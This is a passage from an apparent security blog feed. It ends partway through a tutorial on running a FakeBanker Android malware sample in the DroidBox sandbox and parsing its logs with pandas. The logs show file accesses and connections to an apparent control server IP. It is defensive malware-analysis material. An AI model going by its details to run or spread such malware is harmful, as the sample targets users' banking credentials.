    <tr>
      <th>content-type</th>
      <td>                                                                            text/html; charset=UTF-8</td>
    </tr>
    <tr>
      <th>x-pingback</th>
      <td>                                                                   http://samuraiblue.com/xmlrpc.php</td>
    </tr>
    <tr>
      <th rowspan="7" valign="top">http://www.openbsd.org/cgi-bin/man.cgi</th>
      <th rowspan="7" valign="top">200</th>
      <th>transfer-encoding</th>
      <td>                                                                                             chunked</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:13 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                            text/html; charset=utf-8</td>
    </tr>
    <tr>
      <th rowspan="15" valign="top">http://www.sysblog.com</th>
      <th rowspan="15" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                               48663</td>
    </tr>
    <tr>
      <th>x-varnish</th>
      <td>                                                                                 718735313 718731229</td>
    </tr>
    <tr>
      <th>x-cache</th>
      <td>                                                                                                 HIT</td>
    </tr>
    <tr>
      <th>x-powered-by</th>
      <td>                                                                                          PHP/5.3.16</td>
    </tr>
    <tr>
      <th>set-cookie</th>
      <td>                                                        PHPSESSID=5vk936712pnke6t5ki26n9frf4; path=/</td>
    </tr>
    <tr>
      <th>accept-ranges</th>
      <td>                                                                                               bytes</td>
    </tr>
    <tr>
      <th>expires</th>
      <td>                                                                       Thu, 19 Nov 1981 08:52:00 GMT</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                              Apache</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>via</th>
      <td>                                                                                         1.1 varnish</td>
    </tr>
    <tr>
      <th>pragma</th>
      <td>                                                                                            no-cache</td>
    </tr>
    <tr>
      <th>cache-control</th>
      <td>                                      no-store, no-cache, must-revalidate, post-check=0, pre-check=0</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:14 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                            text/html; charset=UTF-8</td>
    </tr>
    <tr>
      <th>age</th>
      <td>                                                                                                  40</td>
    </tr>
    <tr>
      <th rowspan="7" valign="top">http://www.voicesofsafety.com</th>
      <th rowspan="7" valign="top">200</th>
      <th>content-length</th>
      <td>                                                                                               20854</td>
    </tr>
    <tr>
      <th>accept-ranges</th>
      <td>                                                                                        bytes, bytes</td>
    </tr>
    <tr>
      <th>server</th>
      <td>                                                                                            Apache/2</td>
    </tr>
    <tr>
      <th>connection</th>
      <td>                                                                                               close</td>
    </tr>
    <tr>
      <th>date</th>
      <td>                                                                       Wed, 06 Aug 2014 11:45:15 GMT</td>
    </tr>
    <tr>
      <th>content-type</th>
      <td>                                                                                           text/html</td>
    </tr>
    <tr>
      <th>age</th>
      <td>                                                                                                   0</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="save-to-excel">Save to Excel</h2>
<p>Now feel free to do whatever you want with your DataFrames: Export them to CSV, EXCEL, TXT etc.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pandas import ExcelWriter
writer = ExcelWriter(&#39;Excel/output.xls&#39;)
df_whois.to_excel(writer, &#34;Sheet - WHOIS&#34;)
df_dns.to_excel(writer, &#34;Sheet - DNS&#34;)
#df_connection.to_excel(writer, &#34;Sheet - Connections&#34;)
</code></pre></div><p>Since I wasn&rsquo;t able to export the <code>df_connection</code> to Excel (<code>Exception: Unexpected data type &lt;class 'socket.timeout'&gt;</code>) I had to export it to CSV:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_connection.to_csv(&#34;Excel/connection.csv&#34;, sep=&#34;\t&#34;, header=True)
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Android Dynamic Code Analysis - Mastering DroidBox</title>
      <link>https://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox/</link>
      <pubDate>Tue, 05 Aug 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox/</guid>
      <content:encoded><![CDATA[<p>In this article I&rsquo;ll have a a closer look at <a href="https://code.google.com/p/droidbox/">DroidBox</a> which provides a mobile sandbox to look at Android applications. In the previous <a href="/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/">post</a> I&rsquo;ve dealt with <em>static code analysis</em>. This time will start running our malicious application and look at the &ldquo;noise&rdquo; it generates. That would be:</p>
<ul>
<li>file system access</li>
<li>network activity</li>
<li>interaction with the operating system</li>
<li>interaction with other applications</li>
<li>etc.</li>
</ul>
<p><em>DroidBox</em> is very easy to use and consists of an own system image and kernel meant to log one applications activities. Using <code>adb logcat</code> <em>DroidBox</em> will look for certain debug messages and collect anything related to the monitored app. However I must say that loged data isn&rsquo;t always complete. Sometimes you&rsquo;ll get only a <em>striped</em> version of the data which caused the activity. In that case it&rsquo;s almost impossible e.g. to have a deep look at the network traffic (especially HTTP). You won&rsquo;t be able to construct a full request-response-sequence due to missing data. Nevertheless you can use DroidBox to get an overview of malicious activities triggered by the app. For a more technical analysis of the data you&rsquo;ll need additional tools (more to come in future posts).</p>
<h3 id="requirements-for-droidbox">Requirements for DroidBox</h3>
<p>First you&rsquo;ll have to install some requirements DroidBox needs. First make sure you have the system relevant packages installed:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# apt-get install python-virtualenv libatlas-dev liblapack-dev libblas-dev
</code></pre></div><p>You&rsquo;ll need those in order to use <code>scipy</code>, <code>matplotlib</code> and <code>numpy</code> along with Droidbox. Now create a virtual environment and install <em>python</em> dependencies:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/work/apk# mkdir env
root@kali:~/work/apk# virtualenv env
...
root@kali:~/work/apk# <span style="color:#24909d">source</span> env/bin/activate
(env)root@kali:~/work/apk# pip install numpy scipy matplotlib
</code></pre></div><h3 id="install-droidbox">Install Droidbox</h3>
<p>Download the package:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(env)root@kali:~/work/apk# wget https://droidbox.googlecode.com/files/DroidBox411RC.tar.gz
</code></pre></div><h3 id="setup-path">Setup PATH</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import os
import sys

# Setup new PATH
old_path = os.environ[&#39;PATH&#39;]
new_path = old_path + &#34;:&#34; + &#34;/root/work/apk/SDK/android-sdk-linux/tools:/root/work/apk/SDK/android-sdk-linux/platform-tools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0&#34;
os.environ[&#39;PATH&#39;] = new_path

# Change working directory
os.chdir(&#34;/root/work/apk/DroidBox_4.1.1/&#34;)
</code></pre></div><h3 id="setup-ipython-settings">Setup IPython settings</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%pylab inline
import binascii
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import networkx as nx
import datetime as dt
import time
import ipy_table
from IPython.display import display_pretty, display_html, display_jpeg, display_png, display_json, display_latex, display_svg
from IPython.display import HTML
from IPython.core.magic import register_cell_magic, Magics, magics_class, cell_magic
import jinja2

# Ipython settings
pd.set_option(&#39;display.height&#39;, 1000)
pd.set_option(&#39;display.max_rows&#39;, 500)
pd.set_option(&#39;display.max_columns&#39;, 500)
pd.set_option(&#39;display.max_colwidth&#39;, 100)
pd.set_option(&#39;display.width&#39;, 1000)
pd.set_option(&#39;display.column_space&#39;, 1000)
</code></pre></div><pre><code>Populating the interactive namespace from numpy and matplotlib
height has been deprecated.
</code></pre>
<h3 id="external-extensions">External extensions</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Install
%install_ext https://raw.githubusercontent.com/dorneanu/ipython/master/extensions/diagmagic.py
    
# Then load extensions
%load_ext diagmagic
</code></pre></div><pre><code>Installed diagmagic.py. To use it, type:
  %load_ext diagmagic
</code></pre>
<h3 id="utilities">Utilities</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from IPython import display
from IPython.core.magic import register_cell_magic, Magics, magics_class, cell_magic
import jinja2

# &lt;!-- collapse=True --&gt;
def df2table(df):
    &#34;&#34;&#34; Outputs a DataFrame as a table using ipy_table &#34;&#34;&#34;
    entries = [list(i) for i in df.itertuples()]
    
    # Extract table header
    header = list(df.columns)
    
    # Add index to header
    header.insert(0, df.index.name)
    
    # Insert header at 1st place
    entries.insert(0, header)

    return ipy_table.make_table(entries)

# Create jinja cell magic (http://nbviewer.ipython.org/urls/gist.github.com/bj0/5343292/raw/23a0845ee874827e3635edb0bf5701710a537bfc/jinja2.ipynb)
@magics_class
class JinjaMagics(Magics):
    &#39;&#39;&#39;Magics class containing the jinja2 magic and state&#39;&#39;&#39;
    
    def __init__(self, shell):
        super(JinjaMagics, self).__init__(shell)
        
        # create a jinja2 environment to use for rendering
        # this can be modified for desired effects (ie: using different variable syntax)
        self.env = jinja2.Environment(loader=jinja2.FileSystemLoader(&#39;.&#39;))
        
        # possible output types
        self.display_functions = dict(html=display.HTML, 
                                      latex=display.Latex,
                                      json=display.JSON,
                                      pretty=display.Pretty,
                                      display=display.display)

    
    @cell_magic
    def jinja(self, line, cell):
        &#39;&#39;&#39;
        jinja2 cell magic function.  Contents of cell are rendered by jinja2, and 
        the line can be used to specify output type.

        ie: &#34;%%jinja html&#34; will return the rendered cell wrapped in an HTML object.
        &#39;&#39;&#39;
        f = self.display_functions.get(line.lower().strip(), display.display)
        
        tmp = self.env.from_string(cell)
        rend = tmp.render(dict((k,v) for (k,v) in self.shell.user_ns.items() 
                                        if not k.startswith(&#39;_&#39;) and k not in self.shell.user_ns_hidden))
        
        return f(rend)
        
    
ip = get_ipython()
ip.register_magics(JinjaMagics)
</code></pre></div><h2 id="create-android-virtual-device-adv">Create Android Virtual Device (ADV)</h2>
<p>Now you&rsquo;ll have to install an Android device virtually in order to analyze the APK. Supposing you have installed the SDK in the previous step now you should have some <em>targets</em> available on your machine. If not (that was my case) then make sure you have a X session running and run <code>android</code> from the console. In my case I&rsquo;ve fired up <code>vnc</code> and connected to the Kali machine.</p>
<p>This is what I&rsquo;ve got:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
android list targets | head -n <span style="color:#3677a9">10</span>
</code></pre></div><pre><code>Available Android targets:
----------
id: 1 or &quot;android-16&quot;
     Name: Android 4.1.2
     Type: Platform
     API level: 16
     Revision: 4
     Skins: WXGA800-7in, WQVGA400, WVGA800 (default), WXGA800, HVGA, WSVGA, WVGA854, WQVGA432, WXGA720, QVGA
 Tag/ABIs : default/armeabi-v7a
----------
</code></pre>
<p>Now we <strong>create</strong> the AVD using following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># android create avd --abi default/armeabi-v7a -n android-4.1.2-droidbox -t 1 -c 1000M
Android 4.1.2 is a basic Android platform.
Do you wish to create a custom hardware profile [no]
Created AVD &#39;android-4.1.2-droidbox&#39; based on Android 4.1.2, ARM (armeabi-v7a) processor,
with the following hardware config:
hw.lcd.density=240
hw.ramSize=512
hw.sdCard=yes
vm.heapSize=48

</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
android list avd
</code></pre></div><pre><code>Available Android Virtual Devices:
    Name: android-4.1.2-droidbox
    Path: /root/.android/avd/android-4.1.2-droidbox.avd
  Target: Android 4.1.2 (API level 16)
 Tag/ABI: default/armeabi-v7a
    Skin: WVGA800
  Sdcard: 1000M
</code></pre>
<h3 id="start-the-emulator">Start the emulator</h3>
<p>In <code>DroidBox</code>s package directory you&rsquo;ll find <code>startemu.sh</code>. Open it and add your favourite parameters.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
cat startemu.sh
</code></pre></div><pre><code>#!/usr/bin/env bash

emulator -avd $1 -system images/system.img -ramdisk images/ramdisk.img -wipe-data -prop dalvik.vm.execution-mode=int:portable &amp;
</code></pre>
<p>Afterwards make sure you have a X session and <strong>run</strong> the emulator with your previously created AVD:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(env)root@kali:~/work/apk/DroidBox# ./startemu.sh android-4.1.2-droidbox
...
</code></pre></div><p>Now you should see your emulator booting &hellip;</p>
<h3 id="run-droidbox">Run DroidBox</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!./droidbox.sh /root/work/apk/DroidBox_4.1.1/APK/FakeBanker.apk
</code></pre></div><pre><code>[H[2J ____                        __  ____
/\  _`\               __    /\ \/\  _`\
\ \ \/\ \  _ __  ___ /\_\   \_\ \ \ \L\ \   ___   __  _
 \ \ \ \ \/\`'__\ __`\/\ \  /'_` \ \  _ &lt;' / __`\/\ \/'\
  \ \ \_\ \ \ \/\ \L\ \ \ \/\ \L\ \ \ \L\ \ \L\ \/&gt;  &lt;/
   \ \____/\ \_\ \____/\ \_\ \___,_\ \____/ \____//\_/\_\
    \/___/  \/_/\/___/  \/_/\/__,_ /\/___/ \/___/ \//\/_/
Waiting for the device...
Installing the application /root/work/apk/DroidBox_4.1.1/APK/FakeBanker.apk...
Running the component com.gmail.xpack/com.gmail.xpack.MainActivity...
Starting the activity com.gmail.xpack.MainActivity...
Application started
Analyzing the application during infinite time seconds...
^C
</code></pre>
<blockquote>
<p>DroidBox will then listen for activities until you kill it by ^C.</p>
</blockquote>
<p>Meanwhile I was interacting with the APP and saw that DroidBox was collecting the logs during the interacttions.
DroidBox will output its results as a JSON file. <strong>I&rsquo;ve uploaded the results to <a href="http://pastebin.com/7YSb3EMW">pastebin.com</a></strong>. Now let&rsquo;s have some fun and take a look at the results.</p>
<p>Before starting analyzing the output keep in mind that:</p>
<blockquote>
<p>[&hellip;] all data received/sent, read/written are shown in hexadecimal since the handled data can contain binary data.</p>
<p>(Source: <a href="https://github.com/floe/mobile-sandbox/blob/master/DroidBox_4.1.1/scripts/droidbox.py">https://github.com/floe/mobile-sandbox/blob/master/DroidBox_4.1.1/scripts/droidbox.py</a>)</p>
</blockquote>
<h2 id="results-analysis">Results analysis</h2>
<p>First let&rsquo;s download the data and let python parse it</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
import json
import urllib
url = &#34;http://pastebin.com/raw.php?i=7YSb3EMW&#34;

# Load data
jsonurl = urllib.urlopen(url)
result = json.loads(jsonurl.read())

# Show dictionary keys
result.keys()
</code></pre></div><pre><code>[u'apkName',
 u'enfperm',
 u'opennet',
 u'cryptousage',
 u'sendsms',
 u'servicestart',
 u'sendnet',
 u'closenet',
 u'accessedfiles',
 u'fdaccess',
 u'dataleaks',
 u'recvnet',
 u'dexclass',
 u'hashes',
 u'recvsaction',
 u'phonecalls']
</code></pre>
<p>So we have diffenrent categories of activities we can look at. After analyzing the JSON content I&rsquo;ve come to following most important activities.</p>
<h2 id="file-system-activities">File system activities</h2>
<p>Let&rsquo;s have a look at the file system access actions triggered by the application. Due to DroidBox limitations I couldn&rsquo;t have a look at the <strong>complete</strong> raw data.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
# Convert timestamps to human readable time delta
timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(&#34;utf-8&#34;)))))) for i in result[&#39;fdaccess&#39;].keys()]

# Create list of accessed files entries
accessed_files = [i[1] for i in result[&#39;fdaccess&#39;].items()]

# Create dataframe
df_accessedfiles = pd.DataFrame(accessed_files, index=timestamps)
df_accessedfiles.sort(inplace=True)
df_accessedfiles.index.name=&#39;Timestamp&#39;

# Unhexlify data
unhexed_data = [binascii.unhexlify(d) for d in df_accessedfiles[&#39;data&#39;]]
df_accessedfiles[&#39;rawdata&#39;] = unhexed_data

df2table(df_accessedfiles[[&#39;operation&#39;, &#39;path&#39;, &#39;rawdata&#39;]].reset_index())
#ipy_table.apply_theme(&#39;basic&#39;)
df_accessedfiles[[&#39;operation&#39;, &#39;path&#39;, &#39;rawdata&#39;]].reset_index()
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Timestamp</th>
      <th>operation</th>
      <th>path</th>
      <th>rawdata</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> 0:00:03</td>
      <td>  read</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;string name="DOWNLOADDOMAIN"&gt;c...</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> 0:00:04</td>
      <td>  read</td>
      <td>                                   /proc/1184/cmdline</td>
      <td> com.gmail.xpackï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½p/FakeBanker.apkï¿½ain...</td>
    </tr>
    <tr>
      <th>2 </th>
      <td> 0:00:04</td>
      <td>  read</td>
      <td>                                   /proc/1197/cmdline</td>
      <td> logcatï¿½DroidBox:Wï¿½dalvikvm:Wï¿½ActivityManager:Iï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½p/FakeBanker.apkï¿½ain...</td>
    </tr>
    <tr>
      <th>3 </th>
      <td> 0:00:08</td>
      <td>  read</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;string name="DOWNLOADDOMAIN"&gt;c...</td>
    </tr>
    <tr>
      <th>4 </th>
      <td> 0:00:09</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;string name="DOWNLOADDOMAIN"&gt;c...</td>
    </tr>
    <tr>
      <th>5 </th>
      <td> 0:00:10</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;string name="DOWNLOADDOMAIN"&gt;c...</td>
    </tr>
    <tr>
      <th>6 </th>
      <td> 0:00:10</td>
      <td>  read</td>
      <td>                                   /proc/1205/cmdline</td>
      <td> com.gmail.xpack:remoteï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½p/FakeBanker.apkï¿½ain...</td>
    </tr>
    <tr>
      <th>7 </th>
      <td> 0:00:36</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>8 </th>
      <td> 0:00:36</td>
      <td>  read</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;string name="DOWNLOADDOMAIN"&gt;c...</td>
    </tr>
    <tr>
      <th>9 </th>
      <td> 0:01:05</td>
      <td>  read</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>10</th>
      <td> 0:15:06</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>11</th>
      <td> 0:15:06</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>12</th>
      <td> 0:15:24</td>
      <td>  read</td>
      <td>                                         /dev/urandom</td>
      <td>                                                                                E0ï¿½ï¿½2qVï¿½ï¿½ï¿½4!=ï¿½Ndï¿½ï¿½V</td>
    </tr>
    <tr>
      <th>13</th>
      <td> 0:15:27</td>
      <td>  read</td>
      <td>                                   /proc/1239/cmdline</td>
      <td> com.android.exchangeï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½p/FakeBanker.apkï¿½ain...</td>
    </tr>
    <tr>
      <th>14</th>
      <td> 0:15:35</td>
      <td>  read</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>15</th>
      <td> 0:15:37</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>16</th>
      <td> 0:15:37</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>17</th>
      <td> 0:15:58</td>
      <td>  read</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>18</th>
      <td> 0:16:00</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>19</th>
      <td> 0:16:01</td>
      <td> write</td>
      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>
      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n&lt;int name="PASSADDED" value="10...</td>
    </tr>
    <tr>
      <th>20</th>
      <td> 0:16:10</td>
      <td>  read</td>
      <td>                                      /proc/wakelocks</td>
      <td> name\tcount\texpire_count\twake_count\tactive_since\ttotal_time\tsleep_time\tmax_time\tlast_chan...</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="network-activities">Network activities</h2>
<h3 id="opened-connections-opennet">Opened connections (opennet)</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
# Convert timestamps to human readable time delta
timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(&#34;utf-8&#34;)))))) for i in result[&#39;opennet&#39;].keys()]

# Create list of accessed files entries
open_net = [i[1] for i in result[&#39;opennet&#39;].items()]

# Create dataframe
df_opennet = pd.DataFrame(open_net, index=timestamps)
df_opennet.sort(inplace=True)
df_opennet.index.name=&#39;Timestamp&#39;


#df2table(df_opennet)
#ipy_table.apply_theme(&#39;basic&#39;)
df_opennet.reset_index()
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Timestamp</th>
      <th>desthost</th>
      <th>destport</th>
      <th>fd</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> 0:00:08</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 17</td>
    </tr>
    <tr>
      <th>1</th>
      <td> 0:15:06</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 23</td>
    </tr>
    <tr>
      <th>2</th>
      <td> 0:15:36</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 28</td>
    </tr>
    <tr>
      <th>3</th>
      <td> 0:16:00</td>
      <td> 80.74.128.17</td>
      <td> 80</td>
      <td> 33</td>
    </tr>
  </tbody>
</table>
</div>
<h3 id="sent-data-sendnet">Sent data (sendnet)</h3>
<p>Here you can have a look at the sent data. Again: The POST/GET requests are not fully complete.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
# Convert timestamps to human readable time delta
timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(&#34;utf-8&#34;)))))) for i in result[&#39;sendnet&#39;].keys()]
# Create list of accessed files entries
send_net = [i[1] for i in result[&#39;sendnet&#39;].items()]

# Create dataframe
df_sendnet = pd.DataFrame(send_net, index=timestamps)
df_sendnet.sort(inplace=True)
df_sendnet.index.name=&#39;Timestamp&#39;

# Unhexlify data
unhexed_data = [binascii.unhexlify(d) for d in df_sendnet[&#39;data&#39;]]
df_sendnet[&#39;rawdata&#39;] = unhexed_data

#df2table(df_sendnet[[&#39;desthost&#39;, &#39;destport&#39;, &#39;fd&#39;, &#39;operation&#39;, &#39;type&#39;, &#39;rawdata&#39;]])
#ipy_table.apply_theme(&#39;basic&#39;)
df_sendnet[[&#39;desthost&#39;, &#39;destport&#39;, &#39;fd&#39;, &#39;operation&#39;, &#39;type&#39;, &#39;rawdata&#39;]].reset_index()
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Timestamp</th>
      <th>desthost</th>
      <th>destport</th>
      <th>fd</th>
      <th>operation</th>
      <th>type</th>
      <th>rawdata</th>
    </tr>
  </thead>
  <tbody>
